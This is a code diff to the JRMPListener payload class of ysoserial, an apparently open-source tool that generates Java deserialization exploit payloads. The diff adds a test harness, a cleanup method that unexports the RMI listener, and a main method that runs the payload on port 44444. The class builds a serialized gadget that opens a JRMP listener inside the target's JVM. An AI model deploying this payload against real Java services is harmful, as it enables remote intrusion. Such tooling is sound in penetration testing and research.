@@ -7,6 +7,7 @@ import java.rmi.server.UnicastRemoteObject;
 
 import sun.rmi.server.ActivationGroupImpl;
 import sun.rmi.server.UnicastServerRef;
+import sun.rmi.transport.ObjectTable;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
@@ -34,9 +35,9 @@ import ysoserial.payloads.util.Reflections;
 @SuppressWarnings ( {
     "restriction"
 } )
-@PayloadTest( skip = "This test would make you potentially vulnerable")
+@PayloadTest(harness="ysoserial.test.payloads.JRMPListenerTest")
 @Authors({ Authors.MBECHLER })
-public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
+public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject>, PostDeserializeReleasable<UnicastRemoteObject> {
 
     public UnicastRemoteObject getObject ( final String command ) throws Exception {
         int jrmpPort = Integer.parseInt(command);
@@ -50,8 +51,13 @@ public class JRMPListener extends PayloadRunner implements ObjectPayload<Unicast
         return uro;
     }
 
+    @Override
+    public void postDeserializeRelease(UnicastRemoteObject obj) throws Exception {
+        // unexport ref to allow listener thread (and jvm) to exit
+        ObjectTable.unexportObject(obj, true);
+    }
 
     public static void main ( final String[] args ) throws Exception {
-        PayloadRunner.run(JRMPListener.class, args);
+        UnicastRemoteObject uro = PayloadRunner.run(JRMPListener.class, new String[] { "44444" });
     }
 }
